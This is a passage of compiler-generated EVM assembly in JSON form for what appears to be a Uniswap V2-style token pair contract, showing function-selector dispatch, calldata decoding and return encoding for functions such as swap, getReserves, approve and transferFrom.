											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "18160DDD"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "tag",
											"value": "42"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "22C0D9F"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "6FDDE03"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "902F1AC"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18760,
											"name": "REVERT"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "JUMPDEST"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "DUP1"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 16,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 17,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "DUP2"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP2"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "DUP2"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "ADD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "DUP4"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "ADD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "AND"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP2"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP1"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "DUP2"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "ADD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP1"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "DUP2"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "ADD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "DUP3"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "ADD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 21,
											"end": 32,
											"name": "PUSH",
											"value": "100000000"
										},
										{
											"begin": 5,
											"end": 33,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 33,
											"name": "GT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "45"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 46,
											"end": 47,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 43,
											"end": 44,
											"name": "DUP1"
										},
										{
											"begin": 36,
											"end": 48,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "45"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "DUP3"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "ADD"
										},
										{
											"begin": 35,
											"end": 44,
											"name": "DUP4"
										},
										{
											"begin": 28,
											"end": 32,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "DUP3"
										},
										{
											"begin": 8,
											"end": 33,
											"name": "ADD"
										},
										{
											"begin": 5,
											"end": 45,
											"name": "GT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "46"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 58,
											"end": 59,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 55,
											"end": 56,
											"name": "DUP1"
										},
										{
											"begin": 48,
											"end": 60,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "46"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "DUP1"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP1"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "ADD"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP2"
										},
										{
											"begin": 100,
											"end": 109,
											"name": "DUP5"
										},
										{
											"begin": 95,
											"end": 96,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 81,
											"end": 93,
											"name": "DUP4"
										},
										{
											"begin": 77,
											"end": 97,
											"name": "MUL"
										},
										{
											"begin": 67,
											"end": 75,
											"name": "DUP5"
										},
										{
											"begin": 63,
											"end": 98,
											"name": "ADD"
										},
										{
											"begin": 60,
											"end": 110,
											"name": "GT"
										},
										{
											"begin": 39,
											"end": 50,
											"name": "PUSH",
											"value": "100000000"
										},
										{
											"begin": 25,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 22,
											"end": 51,
											"name": "GT"
										},
										{
											"begin": 11,
											"end": 118,
											"name": "OR"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "JUMPI"
										},
										{
											"begin": 131,
											"end": 132,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 128,
											"end": 129,
											"name": "DUP1"
										},
										{
											"begin": 121,
											"end": 133,
											"name": "REVERT"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP1"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "tag",
											"value": "43"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "JUMPDEST"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "STOP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "49"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "50"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "49"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP6"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "51"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "53"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP4"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP3"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "51"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "53"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "AND"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ISZERO"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPI"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "EXP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "NOT"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "AND"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "54"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "RETURN"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "JUMPDEST"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "tag",
											"value": "55"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "JUMPDEST"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "DUP1"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "SWAP5"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "DUP6"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "AND"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "DUP2"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "MSTORE"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "SWAP3"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "SWAP1"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "SWAP4"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "AND"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "DUP4"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "ADD"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "MSTORE"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "AND"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "DUP2"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "DUP4"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "ADD"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "MSTORE"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "SWAP1"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "MLOAD"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "SWAP1"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "DUP2"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "SWAP1"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "SUB"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "ADD"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "SWAP1"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "RETURN"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "58"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "AND"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ADD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH [tag]",
											"value": "59"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "57"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MLOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ISZERO"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ISZERO"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP3"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MSTORE"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MLOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SUB"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ADD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "RETURN"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMPDEST"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH [tag]",
											"value": "61"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "tag",
											"value": "60"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMPDEST"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "DUP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP3"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "AND"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "DUP3"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "MSTORE"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "MLOAD"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "DUP2"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SUB"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "ADD"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "RETURN"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "JUMPDEST"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "DUP1"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
